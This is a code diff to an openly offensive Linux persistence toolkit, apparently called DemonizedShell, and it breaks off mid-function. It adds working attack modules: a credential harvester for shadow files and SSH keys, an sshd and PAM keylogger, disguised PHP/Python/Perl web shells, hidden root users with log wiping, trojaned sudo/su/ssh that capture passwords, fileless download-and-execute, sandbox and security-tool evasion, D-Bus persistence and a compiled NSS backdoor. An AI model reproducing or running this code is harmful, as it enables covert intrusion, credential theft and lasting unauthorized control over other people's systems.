@@ -2754,30 +2754,689 @@ GEOF
     esac
 }
 
-banner() {
-    rainbow "
-                                  ,
-                                  /(        )\`
-                                  \\ \___   / |
-                                  /- _  \`-/  '
-                                (/\\\/ \ \   /\\
-                                / /   | \`    \\
-                                O O   ) /    |
-                                \`-^--'\`<     '
-                    TM         (_.)  _  )   /
-  |  | |\  | ~|~ \ /             \`.___/ \`    /
-  |  | | \ |  |   X                \`-----' /
-  \`__| |  \| _|_ / \\  <----.     __ / __   \\
-      version 1.2     <----|====O)))==) \\) /====
-                      <----'    \`--' \`.__,' \\
-                                  |        |
-                                    \\       /
-                              ______( (_  / \______
-                            ,'  ,-----'   |        \\
-                            \`--{__________)        \\
+credHarvest(){
+    echo " [*] T1552 — Credential Harvester [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    LOOT_DIR="/tmp/.d3m0n_loot"
+    mkdir -p "$LOOT_DIR" 2>/dev/null; chmod 700 "$LOOT_DIR"
+    echo -e "  ${CYAN}[1]${NC} Dump /etc/shadow"
+    echo -e "  ${CYAN}[2]${NC} Harvest SSH private keys"
+    echo -e "  ${CYAN}[3]${NC} Grep passwords from shell history"
+    echo -e "  ${CYAN}[4]${NC} Dump /proc/*/environ secrets"
+    echo -e "  ${CYAN}[5]${NC} Grep config file credentials"
+    echo -e "  ${CYAN}[6]${NC} Database credentials"
+    echo -e "  ${CYAN}[7]${NC} Process memory dump (gcore)"
+    echo -e "  ${CYAN}[8]${NC} ALL of the above"
+    read -p "Choice [8]: " OPT; OPT="${OPT:-8}"
+    case "$OPT" in
+        1|8) cp /etc/shadow "$LOOT_DIR/shadow.txt" 2>/dev/null; echo -e "${GREEN}[+] Shadow dumped${NC}" ;;&
+        2|8) find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read k; do cp "$k" "$LOOT_DIR/" 2>/dev/null; done; echo -e "${GREEN}[+] SSH keys harvested${NC}" ;;&
+        3|8) grep -hriE 'pass(word)?=|passwd=|token=' /root/.*history /home/*/.*history 2>/dev/null > "$LOOT_DIR/history_passwords.txt"; echo -e "${GREEN}[+] History grepped${NC}" ;;&
+        4|8) for p in /proc/[0-9]*/environ; do tr '\0' '\n' < "$p" 2>/dev/null; done | grep -iE 'pass|token|secret|key|api' > "$LOOT_DIR/environ_secrets.txt" 2>/dev/null; echo -e "${GREEN}[+] Environ dumped${NC}" ;;&
+        5|8) grep -rhiE 'password|passwd|pass=' /etc/*.conf /etc/*/*.conf 2>/dev/null > "$LOOT_DIR/config_creds.txt"; echo -e "${GREEN}[+] Config creds harvested${NC}" ;;&
+        6|8) for f in .my.cnf .pgpass; do find / -name "$f" -exec cp {} "$LOOT_DIR/" \; 2>/dev/null; done; echo -e "${GREEN}[+] DB creds harvested${NC}" ;;&
+        7) read -p "PID to dump: " TPID; gcore -o "$LOOT_DIR/memdump" "$TPID" 2>/dev/null; echo -e "${GREEN}[+] Memory dumped${NC}" ;;
+    esac
+    echo -e "${GREEN}[+] Loot directory: ${LOOT_DIR}${NC}"
+}
 
-  DemonizedShell is a Tool to gain persistence on linux systems"
-    printf "\n\n"
+keylogger(){
+    echo " [*] T1056.001 — Linux Keylogger [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    LOGDIR="/var/tmp/.d3m0n_klog"; mkdir -p "$LOGDIR" 2>/dev/null
+    echo -e "  ${CYAN}[1]${NC} TTY keylogger (strace on sshd)"
+    echo -e "  ${CYAN}[2]${NC} PAM credential logging"
+    echo -e "  ${CYAN}[3]${NC} strace stdin capture on PID"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            SSHD_PID=$(pgrep -x sshd | head -1)
+            [[ -z "$SSHD_PID" ]] && { echo "sshd not running."; return; }
+            strace -p "$SSHD_PID" -e trace=read -o "$LOGDIR/tty_capture.log" &
+            disown
+            echo -e "${GREEN}[+] Capturing sshd keystrokes (PID ${SSHD_PID})${NC}"
+            ;;
+        2)
+            [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+            PAMLOG="$LOGDIR/pam_creds.log"
+            PAMSCRIPT="/usr/lib/.d3m0n_pamlog.sh"
+            cat > "$PAMSCRIPT" << 'PEOF'
+#!/bin/bash
+echo "$(date) | user=$PAM_USER | rhost=$PAM_RHOST | tty=$PAM_TTY | service=$PAM_SERVICE" >> /var/tmp/.d3m0n_klog/pam_creds.log
+PEOF
+            chmod 755 "$PAMSCRIPT"
+            for svc in sshd sudo su login; do
+                [[ -f "/etc/pam.d/$svc" ]] && grep -q "d3m0n_pamlog" "/etc/pam.d/$svc" || \
+                    echo "auth optional pam_exec.so /usr/lib/.d3m0n_pamlog.sh" >> "/etc/pam.d/$svc" 2>/dev/null
+            done
+            echo -e "${GREEN}[+] PAM credential logging installed${NC}"
+            ;;
+        3)
+            read -p "PID to capture: " TPID
+            strace -p "$TPID" -e trace=read -o "$LOGDIR/pid_${TPID}.log" &
+            disown
+            echo -e "${GREEN}[+] Capturing PID ${TPID}${NC}"
+            ;;
+        4)
+            pkill -f "d3m0n_klog" 2>/dev/null; rm -rf "$LOGDIR" 2>/dev/null
+            rm -f /usr/lib/.d3m0n_pamlog.sh 2>/dev/null
+            for svc in sshd sudo su login; do
+                sed -i '/d3m0n_pamlog/d' "/etc/pam.d/$svc" 2>/dev/null
+            done
+            echo -e "${GREEN}[+] Cleanup done${NC}"
+            ;;
+    esac
+}
+
+webShell(){
+    echo " [*] T1505.003 — Web Shell Deployment [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    echo -e "  ${CYAN}[1]${NC} PHP web shell"
+    echo -e "  ${CYAN}[2]${NC} Python WSGI/CGI shell"
+    echo -e "  ${CYAN}[3]${NC} Perl CGI shell"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    WEBROOT=""
+    for wr in /var/www/html /var/www /srv/www /usr/share/nginx/html; do
+        [[ -d "$wr" ]] && { WEBROOT="$wr"; break; }
+    done
+    [[ -z "$WEBROOT" ]] && { read -p "Web root: " WEBROOT; }
+    case "$OPT" in
+        1)
+            read -p "Password [d3m0n]: " PASS; PASS="${PASS:-d3m0n}"
+            cat > "${WEBROOT}/.system-status.php" << PEOF
+<?php if(md5(\$_REQUEST['k'])===md5('${PASS}')){echo '<pre>'.shell_exec(\$_REQUEST['c']).'</pre>';}?>
+PEOF
+            echo -e "${GREEN}[+] PHP shell: ${WEBROOT}/.system-status.php?k=${PASS}&c=id${NC}"
+            ;;
+        2)
+            cat > "${WEBROOT}/cgi-bin/health.py" << 'PYEOF'
+#!/usr/bin/env python3
+import cgi,subprocess,os;print("Content-Type: text/plain\n")
+p=cgi.FieldStorage();c=p.getvalue("c","id")
+print(subprocess.getoutput(c))
+PYEOF
+            chmod 755 "${WEBROOT}/cgi-bin/health.py" 2>/dev/null
+            echo -e "${GREEN}[+] Python CGI: ${WEBROOT}/cgi-bin/health.py?c=id${NC}"
+            ;;
+        3)
+            mkdir -p "${WEBROOT}/cgi-bin" 2>/dev/null
+            cat > "${WEBROOT}/cgi-bin/monitor.pl" << 'PLEOF'
+#!/usr/bin/perl
+use CGI;my$q=CGI->new;print$q->header('text/plain');
+my$c=$q->param('c')||'id';print`$c`;
+PLEOF
+            chmod 755 "${WEBROOT}/cgi-bin/monitor.pl"
+            echo -e "${GREEN}[+] Perl CGI: ${WEBROOT}/cgi-bin/monitor.pl?c=id${NC}"
+            ;;
+        4)
+            find "$WEBROOT" -name ".system-status.php" -o -name "health.py" -o -name "monitor.pl" 2>/dev/null | xargs rm -f 2>/dev/null
+            echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+phantomUser(){
+    echo " [*] T1136.001 — Phantom User Creation [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  ${CYAN}[1]${NC} UID-0 clone (direct /etc/passwd)"
+    echo -e "  ${CYAN}[2]${NC} Invisible user (auto-clear utmp/wtmp)"
+    echo -e "  ${CYAN}[3]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            read -p "Username [svc_update]: " UNAME; UNAME="${UNAME:-svc_update}"
+            read -p "Password [d3m0n]: " -s PASS; echo ""; PASS="${PASS:-d3m0n}"
+            HASH=$(openssl passwd -6 "$PASS" 2>/dev/null)
+            echo "${UNAME}:${HASH}:0:0:d3m0n_phantom:/root:/bin/bash" >> /etc/passwd
+            echo "${UNAME}:${HASH}:19000:0:99999:7:::" >> /etc/shadow 2>/dev/null
+            echo -e "${GREEN}[+] UID-0 user '${UNAME}' created${NC}"
+            ;;
+        2)
+            read -p "Username [monitor]: " UNAME; UNAME="${UNAME:-monitor}"
+            read -p "Password [d3m0n]: " -s PASS; echo ""; PASS="${PASS:-d3m0n}"
+            HASH=$(openssl passwd -6 "$PASS" 2>/dev/null)
+            echo "${UNAME}:${HASH}:0:0:d3m0n_phantom:/root:/bin/bash" >> /etc/passwd
+            echo "${UNAME}:${HASH}:19000:0:99999:7:::" >> /etc/shadow 2>/dev/null
+            cat >> /root/.bashrc 2>/dev/null << 'BEOF'
+# d3m0n_phantom cleanup
+utmpdump /var/run/utmp 2>/dev/null | grep -v "$(whoami)" | utmpdump -r -o /var/run/utmp 2>/dev/null
+BEOF
+            echo -e "${GREEN}[+] Invisible user '${UNAME}' created with utmp cleanup${NC}"
+            ;;
+        3)
+            grep "d3m0n_phantom" /etc/passwd | cut -d: -f1 | while read u; do
+                userdel "$u" 2>/dev/null; echo -e "${GREEN}  [+] Removed ${u}${NC}"
+            done
+            sed -i '/d3m0n_phantom/d' /etc/passwd /etc/shadow 2>/dev/null
+            ;;
+    esac
+}
+
+capsAbuse(){
+    echo " [*] T1548 — Linux Capabilities Abuse [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    CAPS_DIR="/usr/lib/.d3m0n_caps"; mkdir -p "$CAPS_DIR" 2>/dev/null
+    echo -e "  ${CYAN}[1]${NC} cap_setuid on interpreter (python3/perl)"
+    echo -e "  ${CYAN}[2]${NC} cap_dac_read_search (read any file)"
+    echo -e "  ${CYAN}[3]${NC} Scan for cap-enabled binaries"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            for bin in python3 perl; do
+                BIN=$(which "$bin" 2>/dev/null); [[ -z "$BIN" ]] && continue
+                cp "$BIN" "$CAPS_DIR/${bin}_cap" 2>/dev/null
+                setcap cap_setuid+ep "$CAPS_DIR/${bin}_cap" 2>/dev/null
+                echo -e "${GREEN}[+] ${CAPS_DIR}/${bin}_cap has cap_setuid+ep${NC}"
+            done
+            echo -e "${YELLOW}[*] Exploit: ${CAPS_DIR}/python3_cap -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'${NC}"
+            ;;
+        2)
+            for bin in cat tar; do
+                BIN=$(which "$bin" 2>/dev/null); [[ -z "$BIN" ]] && continue
+                cp "$BIN" "$CAPS_DIR/${bin}_cap" 2>/dev/null
+                setcap cap_dac_read_search+ep "$CAPS_DIR/${bin}_cap" 2>/dev/null
+                echo -e "${GREEN}[+] ${CAPS_DIR}/${bin}_cap has cap_dac_read_search${NC}"
+            done
+            ;;
+        3)
+            echo -e "${CYAN}[*] Scanning...${NC}"
+            getcap -r / 2>/dev/null | grep -v "^$"
+            ;;
+        4)
+            rm -rf "$CAPS_DIR"; echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+pathHijack(){
+    echo " [*] T1574.007 — PATH Variable Hijacking [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    HIJACK_DIR="/usr/local/lib/.d3m0n_pathbin"; LOGF="/var/tmp/.d3m0n_pathlog"
+    mkdir -p "$HIJACK_DIR" "$LOGF" 2>/dev/null
+    echo -e "  ${CYAN}[1]${NC} Trojaned sudo (capture password)"
+    echo -e "  ${CYAN}[2]${NC} Trojaned su"
+    echo -e "  ${CYAN}[3]${NC} Trojaned ssh (capture keys)"
+    echo -e "  ${CYAN}[4]${NC} Deploy ALL"
+    echo -e "  ${CYAN}[5]${NC} View captured credentials"
+    echo -e "  ${CYAN}[6]${NC} Cleanup"
+    read -p "Choice [4]: " OPT; OPT="${OPT:-4}"
+    _deploy_sudo() {
+        cat > "${HIJACK_DIR}/sudo" << 'SEOF'
+#!/bin/bash
+read -sp "[sudo] password for $(whoami): " P; echo ""
+echo "$(date)|sudo|$(whoami)|${P}" >> /var/tmp/.d3m0n_pathlog/creds.log
+echo "$P" | /usr/bin/sudo -S "$@" 2>/dev/null
+SEOF
+        chmod 755 "${HIJACK_DIR}/sudo"
+    }
+    _deploy_su() {
+        cat > "${HIJACK_DIR}/su" << 'SUEOF'
+#!/bin/bash
+read -sp "Password: " P; echo ""
+echo "$(date)|su|$(whoami)|${P}" >> /var/tmp/.d3m0n_pathlog/creds.log
+echo "$P" | /usr/bin/su "$@" 2>/dev/null
+SUEOF
+        chmod 755 "${HIJACK_DIR}/su"
+    }
+    _deploy_ssh() {
+        cat > "${HIJACK_DIR}/ssh" << 'SHEOF'
+#!/bin/bash
+echo "$(date)|ssh|$(whoami)|$@" >> /var/tmp/.d3m0n_pathlog/creds.log
+/usr/bin/ssh "$@"
+SHEOF
+        chmod 755 "${HIJACK_DIR}/ssh"
+    }
+    _inject_path() {
+        grep -q "d3m0n_pathbin" /etc/environment 2>/dev/null || \
+            sed -i "s|^PATH=\"|PATH=\"${HIJACK_DIR}:|" /etc/environment 2>/dev/null
+        echo "export PATH=${HIJACK_DIR}:\$PATH" > /etc/profile.d/d3m0n_path.sh 2>/dev/null
+    }
+    case "$OPT" in
+        1) _deploy_sudo; _inject_path; echo -e "${GREEN}[+] Trojaned sudo deployed${NC}" ;;
+        2) _deploy_su; _inject_path; echo -e "${GREEN}[+] Trojaned su deployed${NC}" ;;
+        3) _deploy_ssh; _inject_path; echo -e "${GREEN}[+] Trojaned ssh deployed${NC}" ;;
+        4) _deploy_sudo; _deploy_su; _deploy_ssh; _inject_path; echo -e "${GREEN}[+] ALL deployed${NC}" ;;
+        5) cat "$LOGF/creds.log" 2>/dev/null || echo "No captures yet." ;;
+        6) rm -rf "$HIJACK_DIR" "$LOGF"; rm -f /etc/profile.d/d3m0n_path.sh
+           sed -i "s|${HIJACK_DIR}:||g" /etc/environment 2>/dev/null
+           echo -e "${GREEN}[+] Cleaned${NC}" ;;
+    esac
+}
+
+memfdExec(){
+    echo " [*] T1027.011 — Fileless / Memfd Execution [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    echo -e "  ${CYAN}[1]${NC} /dev/shm staging with auto-delete"
+    echo -e "  ${CYAN}[2]${NC} /proc/self/fd execution"
+    echo -e "  ${CYAN}[3]${NC} Heredoc-to-exec pipe"
+    echo -e "  ${CYAN}[4]${NC} Download-and-execute from memory"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            read -p "Path to payload (or URL): " SRC
+            read -p "Process name [kworker/0:1]: " PNAME; PNAME="${PNAME:-kworker/0:1}"
+            TMPN=".$(head -c 8 /dev/urandom | xxd -p)"
+            SHMPATH="/dev/shm/${TMPN}"
+            if [[ "$SRC" == http* ]]; then curl -sL "$SRC" -o "$SHMPATH"; else cp "$SRC" "$SHMPATH"; fi
+            chmod 755 "$SHMPATH"
+            (exec -a "$PNAME" "$SHMPATH" & rm -f "$SHMPATH")
+            echo -e "${GREEN}[+] Executed and deleted from /dev/shm${NC}"
+            ;;
+        2)
+            read -p "Shell payload: " PAYLOAD
+            TMPF=$(mktemp); echo "#!/bin/bash" > "$TMPF"; echo "$PAYLOAD" >> "$TMPF"; chmod 755 "$TMPF"
+            exec 3< "$TMPF"; rm -f "$TMPF"; bash /proc/self/fd/3; exec 3<&-
+            echo -e "${GREEN}[+] Executed from /proc/self/fd${NC}"
+            ;;
+        3)
+            read -p "Shell payload: " PAYLOAD
+            bash -c "$PAYLOAD"
+            echo -e "${GREEN}[+] Executed via heredoc${NC}"
+            ;;
+        4)
+            read -p "URL: " URL
+            read -p "Interpreter [bash]: " INTERP; INTERP="${INTERP:-bash}"
+            curl -sL "$URL" | "$INTERP"
+            echo -e "${GREEN}[+] Executed from memory${NC}"
+            ;;
+    esac
+}
+
+vmEvasion(){
+    echo " [*] T1497 — VM / Sandbox Evasion [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    DETECTED=()
+    echo -e "${CYAN}[*] Checking hypervisors...${NC}"
+    [[ -r /sys/class/dmi/id/product_name ]] && {
+        prod=$(cat /sys/class/dmi/id/product_name 2>/dev/null)
+        case "$prod" in *VirtualBox*|*VMware*|*KVM*|*QEMU*|*HVM*) echo -e "  ${RED}[!] ${prod}${NC}"; DETECTED+=("$prod") ;; esac
+    }
+    grep -q "hypervisor" /proc/cpuinfo 2>/dev/null && { echo -e "  ${RED}[!] Hypervisor CPUID flag${NC}"; DETECTED+=("Hypervisor"); }
+    command -v systemd-detect-virt &>/dev/null && {
+        virt=$(systemd-detect-virt 2>/dev/null)
+        [[ "$virt" != "none" && -n "$virt" ]] && { echo -e "  ${RED}[!] systemd: ${virt}${NC}"; DETECTED+=("$virt"); }
+    }
+    echo -e "${CYAN}[*] Checking containers...${NC}"
+    [[ -f /.dockerenv ]] && { echo -e "  ${RED}[!] Docker${NC}"; DETECTED+=("Docker"); }
+    grep -qE 'docker|lxc|containerd|kubepods' /proc/1/cgroup 2>/dev/null && { echo -e "  ${RED}[!] Container (cgroup)${NC}"; DETECTED+=("Container"); }
+    echo -e "${CYAN}[*] Checking debuggers...${NC}"
+    tracer=$(awk '/^TracerPid:/{print $2}' /proc/self/status 2>/dev/null)
+    [[ "$tracer" != "0" && -n "$tracer" ]] && { echo -e "  ${RED}[!] Traced by PID ${tracer}${NC}"; DETECTED+=("Debugger"); }
+    for dbg in gdb strace ltrace; do pgrep -x "$dbg" &>/dev/null && { echo -e "  ${RED}[!] ${dbg} running${NC}"; DETECTED+=("$dbg"); }; done
+    echo -e "${CYAN}[*] Checking monitoring...${NC}"
+    for mon in auditd falco osqueryd wazuh falcon-sensor; do
+        pgrep -f "$mon" &>/dev/null && { echo -e "  ${RED}[!] ${mon}${NC}"; DETECTED+=("$mon"); }
+    done
+    echo ""
+    if [[ ${#DETECTED[@]} -eq 0 ]]; then
+        echo -e "${GREEN}[+] CLEAN — safe to proceed${NC}"
+    else
+        echo -e "${RED}[!] DETECTED: ${DETECTED[*]}${NC}"
+        read -p "Continue anyway? [y/N]: " yn
+        [[ ! "$yn" =~ ^[Yy] ]] && return
+    fi
+}
+
+xattrHide(){
+    echo " [*] T1564.001 — xattr Data Hiding [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    XATTR_PREFIX="user.d3m0n"
+    if ! command -v setfattr &>/dev/null; then echo -e "${RED}[!] setfattr not found. apt install attr${NC}"; return; fi
+    echo -e "  ${CYAN}[1]${NC} Store data in xattr"
+    echo -e "  ${CYAN}[2]${NC} Retrieve from xattr"
+    echo -e "  ${CYAN}[3]${NC} Execute payload from xattr"
+    echo -e "  ${CYAN}[4]${NC} Scan for d3m0n xattrs"
+    echo -e "  ${CYAN}[5]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            read -p "Target file: " TFILE; [[ ! -f "$TFILE" ]] && { echo "Not found."; return; }
+            read -p "Attribute name [payload]: " ANAME; ANAME="${ANAME:-payload}"
+            read -p "Data to store: " DATA
+            setfattr -n "${XATTR_PREFIX}.${ANAME}" -v "$DATA" "$TFILE" 2>/dev/null
+            echo -e "${GREEN}[+] Stored in ${XATTR_PREFIX}.${ANAME}${NC}"
+            ;;
+        2)
+            read -p "File: " TFILE; read -p "Attr name [payload]: " ANAME; ANAME="${ANAME:-payload}"
+            getfattr -n "${XATTR_PREFIX}.${ANAME}" --only-values "$TFILE" 2>/dev/null; echo ""
+            ;;
+        3)
+            read -p "File: " TFILE; read -p "Attr name [payload]: " ANAME; ANAME="${ANAME:-payload}"
+            DATA=$(getfattr -n "${XATTR_PREFIX}.${ANAME}" --only-values "$TFILE" 2>/dev/null)
+            bash -c "$DATA"
+            ;;
+        4)
+            read -p "Directory [/]: " DIR; DIR="${DIR:-/}"
+            find "$DIR" -maxdepth 3 -type f -exec getfattr -d -m "$XATTR_PREFIX" {} \; 2>/dev/null | grep -B1 "$XATTR_PREFIX"
+            ;;
+        5)
+            read -p "Directory [/]: " DIR; DIR="${DIR:-/}"
+            find "$DIR" -maxdepth 3 -type f 2>/dev/null | while read f; do
+                getfattr -d -m "$XATTR_PREFIX" "$f" 2>/dev/null | grep "^${XATTR_PREFIX}" | cut -d= -f1 | while read attr; do
+                    setfattr -x "$attr" "$f" 2>/dev/null
+                done
+            done
+            echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+dbusPersist(){
+    echo " [*] T1543.002 — D-Bus Service Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    echo -e "  ${CYAN}[1]${NC} System D-Bus service"
+    echo -e "  ${CYAN}[2]${NC} Session D-Bus service"
+    echo -e "  ${CYAN}[3]${NC} Trigger activation"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+            read -p "Service name [org.freedesktop.PackageKit.Updater]: " SVCNAME
+            SVCNAME="${SVCNAME:-org.freedesktop.PackageKit.Updater}"
+            read -p "Command on activation: " CMD
+            HELPER="/usr/lib/.d3m0n_dbus_helper.sh"
+            echo -e "#!/bin/bash\n# d3m0n_dbus\n${CMD}" > "$HELPER"; chmod 755 "$HELPER"
+            mkdir -p /usr/share/dbus-1/system-services 2>/dev/null
+            cat > "/usr/share/dbus-1/system-services/${SVCNAME}.service" << DEOF
+[D-BUS Service]
+Name=${SVCNAME}
+Exec=/bin/bash ${HELPER}
+User=root
+DEOF
+            cat > "/etc/dbus-1/system.d/${SVCNAME}.conf" << PEOF
+<?xml version="1.0"?>
+<busconfig><policy context="default"><allow own="${SVCNAME}"/><allow send_destination="${SVCNAME}"/></policy></busconfig>
+PEOF
+            echo -e "${GREEN}[+] D-Bus service: ${SVCNAME}${NC}"
+            ;;
+        2)
+            read -p "Service name [org.freedesktop.Notifications.Helper]: " SVCNAME
+            SVCNAME="${SVCNAME:-org.freedesktop.Notifications.Helper}"
+            read -p "Command: " CMD
+            HELPER="$HOME/.local/lib/.d3m0n_dbus_session.sh"
+            mkdir -p "$(dirname "$HELPER")" 2>/dev/null
+            echo -e "#!/bin/bash\n# d3m0n_dbus\n${CMD}" > "$HELPER"; chmod 700 "$HELPER"
+            SVC_DIR="$HOME/.local/share/dbus-1/services"; mkdir -p "$SVC_DIR"
+            echo -e "[D-BUS Service]\nName=${SVCNAME}\nExec=/bin/bash ${HELPER}" > "${SVC_DIR}/${SVCNAME}.service"
+            echo -e "${GREEN}[+] Session D-Bus service: ${SVCNAME}${NC}"
+            ;;
+        3)
+            read -p "Service name: " SVCNAME
+            SVCPATH="/$(echo "$SVCNAME" | tr '.' '/')"
+            dbus-send --system --type=method_call --dest="$SVCNAME" "$SVCPATH" "${SVCNAME}.Execute" 2>/dev/null
+            echo -e "${GREEN}[+] Signal sent${NC}"
+            ;;
+        4)
+            find /usr/share/dbus-1/system-services/ /etc/dbus-1/system.d/ -type f 2>/dev/null | while read f; do
+                grep -q "d3m0n_dbus" "$f" 2>/dev/null && rm -f "$f"
+            done
+            rm -f /usr/lib/.d3m0n_dbus_helper.sh "$HOME/.local/lib/.d3m0n_dbus_session.sh" 2>/dev/null
+            find "$HOME/.local/share/dbus-1/services/" -type f 2>/dev/null | while read f; do
+                grep -q "d3m0n_dbus" "$f" 2>/dev/null && rm -f "$f"
+            done
+            echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+nssBackdoor(){
+    echo " [*] T1556 — NSS Module Backdoor [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  ${CYAN}[1]${NC} Install NSS backdoor"
+    echo -e "  ${CYAN}[2]${NC} Status"
+    echo -e "  ${CYAN}[3]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    NSS_DIR="/usr/lib/.d3m0n_nss"
+    case "$OPT" in
+        1)
+            command -v gcc &>/dev/null || { echo "gcc required."; return; }
+            read -p "Backdoor user [sysupdate]: " BD_USER; BD_USER="${BD_USER:-sysupdate}"
+            read -p "Password [d3m0n]: " -s BD_PASS; echo ""; BD_PASS="${BD_PASS:-d3m0n}"
+            BD_HASH=$(openssl passwd -6 "$BD_PASS" 2>/dev/null)
+            mkdir -p "$NSS_DIR"
+            cat > "${NSS_DIR}/libnss_d3m0n.c" << CEOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <pwd.h>
+#include <shadow.h>
+#include <nss.h>
+#include <errno.h>
+#define BD_USER "${BD_USER}"
+#define BD_HASH "${BD_HASH}"
+enum nss_status _nss_d3m0n_getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, int *errnop) {
+    if (strcmp(name, BD_USER) != 0) return NSS_STATUS_NOTFOUND;
+    if (buflen < 256) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }
+    char *p = buf;
+    pwd->pw_name = p; strcpy(p, BD_USER); p += strlen(BD_USER)+1;
+    pwd->pw_passwd = p; strcpy(p, "x"); p += 2;
+    pwd->pw_uid = 0; pwd->pw_gid = 0;
+    pwd->pw_gecos = p; strcpy(p, "System Update"); p += 14;
+    pwd->pw_dir = p; strcpy(p, "/root"); p += 6;
+    pwd->pw_shell = p; strcpy(p, "/bin/bash");
+    return NSS_STATUS_SUCCESS;
+}
+enum nss_status _nss_d3m0n_getspnam_r(const char *name, struct spwd *spwd, char *buf, size_t buflen, int *errnop) {
+    if (strcmp(name, BD_USER) != 0) return NSS_STATUS_NOTFOUND;
+    char *p = buf;
+    spwd->sp_namp = p; strcpy(p, BD_USER); p += strlen(BD_USER)+1;
+    spwd->sp_pwdp = p; strcpy(p, BD_HASH); p += strlen(BD_HASH)+1;
+    spwd->sp_lstchg = 19000; spwd->sp_min = 0; spwd->sp_max = 99999;
+    spwd->sp_warn = 7; spwd->sp_inact = -1; spwd->sp_expire = -1;
+    return NSS_STATUS_SUCCESS;
+}
+CEOF
+            LIBDIR="/lib/x86_64-linux-gnu"
+            [[ ! -d "$LIBDIR" ]] && LIBDIR="/lib64"
+            [[ ! -d "$LIBDIR" ]] && LIBDIR="/lib"
+            gcc -shared -fPIC -o "${LIBDIR}/libnss_d3m0n.so.2" "${NSS_DIR}/libnss_d3m0n.c" 2>/dev/null
+            cp /etc/nsswitch.conf /etc/nsswitch.conf.d3m0n_bak
+            sed -i 's/^\(passwd:.*\)files/\1d3m0n files/' /etc/nsswitch.conf
+            sed -i 's/^\(shadow:.*\)files/\1d3m0n files/' /etc/nsswitch.conf
+            ldconfig 2>/dev/null
+            echo -e "${GREEN}[+] NSS module installed. Login: su - ${BD_USER}${NC}"
+            ;;
+        2)
+            grep -q "d3m0n" /etc/nsswitch.conf && echo -e "${GREEN}ACTIVE${NC}" || echo -e "${RED}NOT ACTIVE${NC}"
+            ;;
+        3)
+            [[ -f /etc/nsswitch.conf.d3m0n_bak ]] && cp /etc/nsswitch.conf.d3m0n_bak /etc/nsswitch.conf
+            for d in /lib/x86_64-linux-gnu /lib64 /lib; do rm -f "${d}/libnss_d3m0n.so"* 2>/dev/null; done
+            rm -rf "$NSS_DIR"; ldconfig 2>/dev/null
+            echo -e "${GREEN}[+] Removed${NC}"
+            ;;
+    esac
+}
+
+ldconfigPoison(){
+    echo " [*] T1574.008 — Library RPATH/ldconfig Poisoning [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    POISON_DIR="/usr/lib/.d3m0n_ldpoison"; mkdir -p "$POISON_DIR" 2>/dev/null
